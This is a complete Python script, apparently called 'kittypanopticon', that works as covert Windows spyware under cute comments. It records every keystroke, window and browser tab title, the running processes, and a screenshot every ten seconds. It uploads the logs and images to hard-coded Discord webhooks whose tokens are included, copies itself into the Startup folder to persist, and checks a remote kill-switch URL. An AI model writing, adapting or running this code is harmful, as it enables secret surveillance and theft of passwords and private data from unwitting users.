import subprocess
import sys
import importlib

def install_and_import(package, import_as=None):
    try:
        return importlib.import_module(import_as or package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        return importlib.import_module(import_as or package)

psutil = install_and_import("psutil")
pynput_keyboard = install_and_import("pynput.keyboard")
pygetwindow = install_and_import("pygetwindow")
requests = install_and_import("requests")
pyautogui = install_and_import("pyautogui")

try:
    win32gui = importlib.import_module("win32gui")
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
    subprocess.call([sys.executable, "-m", "pywin32_postinstall", "-install"])
    import time
    time.sleep(2)
    win32gui = importlib.import_module("win32gui")

import os
import time
import datetime
import threading
import re
import atexit

# === CONFIG ===
BASE_DIR = os.path.dirname(__file__)
LOG_DIR = os.path.join(BASE_DIR, "logs")
CAP_DIR = os.path.join(LOG_DIR, "caps")
CHECK_INTERVAL = 5
KEY_CHUNK_SECONDS = 10
SCREENSHOT_INTERVAL = 10
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1375569138742853812/PRzu6PS24Vch7ugMOM8O8YRNzRDSfHilICpKqNy2ImnFluBxvxitFbsMInRycDL9D3IX"
SECRET_CODE = "@hiii"
KILL_CODE = "@schrodinger"
key_buffer = []
buffer_lock = threading.Lock()
secret_buffer = ""
should_exit = False
SEAGIS_IMAGE_B64 = "meo" 

# === letters to mom ===
def send_discord_message(content):
    try:
        requests.post(DISCORD_WEBHOOK_URL, data={"content": content})
    except:
        pass

def send_yesterdays_log():
    yesterday = datetime.date.today() - datetime.timedelta(days=1)
    filename = f"{yesterday.strftime('%Y-%m-%d')}.txt"
    filepath = os.path.join(LOG_DIR, filename)
    if os.path.exists(filepath):
        with open(filepath, "rb") as f:
            files = {"file": (filename, f)}
            data = {"content": f"📋 **Paniopticat Log - {filename}**\nHere’s your activity summary from yesterday:"}
            try:
                requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
            except:
                pass

# === notes to self ===
def write_log(entry):
    date_str = datetime.date.today().strftime("%Y-%m-%d")
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(os.path.join(LOG_DIR, f"{date_str}.txt"), "a", encoding="utf-8") as file:
        file.write(entry + "\n")

def write_key_log(keystrokes, start_time, end_time):
    global secret_buffer, should_exit
    if not keystrokes:
        return
    text = ''.join(keystrokes)
    secret_buffer += text

    ts = datetime.datetime.now().strftime("%H:%M:%S")
    if SECRET_CODE in secret_buffer:
        write_log(f"SECRET CHECK RECEIVED [{ts}]")
        send_discord_message(f"hiiii! {ts}")
        secret_buffer = ""
    if KILL_CODE in secret_buffer:
        write_log(f"KILL CODE RECEIVED [{ts}]")
        send_discord_message(f"kill command received at {ts}. i is go kill :pensive: .")
        should_exit = True
        secret_buffer = ""

    timestamp = f"[{start_time.strftime('%H:%M:%S')} → {end_time.strftime('%H:%M:%S')}]"
    write_log(f"Keys: {text} {timestamp}")

# === whos that? + the old family pc ===
def get_active_window_title():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def try_log_browser_tab(title):
    if any(b in title.lower() for b in ["chrome", "edge", "firefox", "brave"]):
        ts = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        match = re.search(r"(.*?) - (.*?)$", title)
        tab = match.group(1) if match else title
        write_log(f"{ts} Browser tab: {tab}")

def active_window_loop():
    last_window = ""
    while not should_exit:
        win = get_active_window_title()
        if win != last_window and win.strip():
            ts = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
            write_log(f"{ts} Active window: {win}")
            try_log_browser_tab(win)
            last_window = win
        time.sleep(CHECK_INTERVAL)

# === sit in the living room ===
def on_press(key):
    try:
        with buffer_lock:
            if hasattr(key, 'char') and key.char:
                key_buffer.append(key.char)
            else:
                key_buffer.append(f"<{key.name}>")
    except:
        pass

def log_keys_loop():
    global should_exit
    while not should_exit:
        start = datetime.datetime.now()
        time.sleep(KEY_CHUNK_SECONDS)
        end = datetime.datetime.now()
        with buffer_lock:
            if key_buffer:
                write_key_log(key_buffer[:], start, end)
                key_buffer.clear()

def start_keystroke_logger():
    threading.Thread(target=log_keys_loop, daemon=True).start()
    pynput_keyboard.Listener(on_press=on_press).start()

# === new toys ===
def log_running_processes():
    ts = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    procs = []
    for p in psutil.process_iter(["name", "pid"]):
        try:
            name = p.info.get("name")
            pid = p.info.get("pid")
            if name and pid is not None:
                procs.append((name, pid))
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    lines = [f"{ts} Running programs:"] + [f"  - {n} (PID {pid})" for n, pid in procs]
    write_log("\n".join(lines))

def program_logger_loop():
    while not should_exit:
        log_running_processes()
        time.sleep(30)

# === memories <3 ===
def capture_screen_loop():
    IMAGE_HOOK = "https://discord.com/api/webhooks/1375651188707692584/vwak1NaP3eO713y8TCMfppKCoQTHz6QSp7ozhsQAFnx94aUlHTf51jaFykODaEzgpvW7"
    while not should_exit:
        now = datetime.datetime.now()
        date_folder = os.path.join(CAP_DIR, now.strftime("%Y-%m-%d"))
        os.makedirs(date_folder, exist_ok=True)
        filename = os.path.join(date_folder, f"{now.strftime('%H-%M-%S')}.png")
        try:
            pyautogui.screenshot(filename)

            # Send the screenshot to the webhook
            with open(filename, "rb") as img_file:
                files = {"file": (os.path.basename(filename), img_file, "image/png")}
                data = {"content": f"🖼️ Screenshot {now.strftime('%H:%M:%S')}"}  # optional message
                requests.post(IMAGE_HOOK, data=data, files=files)

        except Exception as e:
            send_discord_message(f"Screenshot failed: {e}")
        time.sleep(SCREENSHOT_INTERVAL)


# === forever home! ===
def setup_autostart_by_copy():
    import shutil
    import os
    import sys

    src_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    dst_path = os.path.join(startup_folder, "kittypanopticon.pyw")

    if not src_path.lower().endswith(".pyw"):
        send_discord_message("erm this is awkward ")
        return

    if not os.path.exists(dst_path):
        try:
            shutil.copy2(src_path, dst_path)
            send_discord_message(f"I is copied to startup folder: `{dst_path}`")
        except Exception as e:
            send_discord_message(f"noo i failed startup: `{e}`")
    else:
        send_discord_message("ℹhuh ive been here before")


# === check the mail ===
def remote_shutdown_check_loop():
    import requests
    global should_exit

    while not should_exit:
        try:
            response = requests.get("https://shouldidie.fiscon.cc", timeout=5)
            if response.status_code == 200 and response.text.strip().lower() == "yes":
                timestamp = datetime.datetime.now().strftime("%H:%M:%S")
                write_log(f"🚨 i looked at this weird website and it told me to kms :( at {timestamp}")
                send_discord_message(f"🔻 i looked at this weird website and it told me to kms :( {timestamp} ")
                should_exit = True
                break
        except Exception as e:
            write_log(f"Remote shutdown check failed: {e}")
        time.sleep(60)  # check every 60 seconds


# === SEAGIS!!! ===
def seagis_exit_action():
    import random
    import base64
    import os

    startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    image_path = os.path.join(startup_folder, "seagis.jpg")
    roll = random.randint(1, 100)

    if roll == 61:
        try:
            with open(image_path, "wb") as f:
                f.write(base64.b64decode(SEAGIS_IMAGE_B64))
            write_log("Rolled 61 on exit — seagis.jpg dropped.")
            send_discord_message("seagis is here!")
        except Exception as e:
            write_log(f"❌ Failed to write seagis.jpg on exit: {e}")
    else:
        if os.path.exists(image_path):
            try:
                os.remove(image_path)
                write_log("Rolled ≠61 on exit — seagis.jpg removed.")
                send_discord_message("🧹 i killa seagis")
            except Exception as e:
                write_log(f"Failed to remove seagis.jpg on exit: {e}")


# === MAIN ===
def on_exit():
    # seagis_exit_action()
    send_discord_message("byeeee :3 i is shut down")

def main():
    atexit.register(on_exit)
    send_discord_message("i is started!")
    setup_autostart_by_copy()
    send_yesterdays_log()
    start_keystroke_logger()
    threading.Thread(target=program_logger_loop, daemon=True).start()
    threading.Thread(target=capture_screen_loop, daemon=True).start()
    threading.Thread(target=remote_shutdown_check_loop, daemon=True).start()
    active_window_loop()
    

if __name__ == "__main__":
    main()
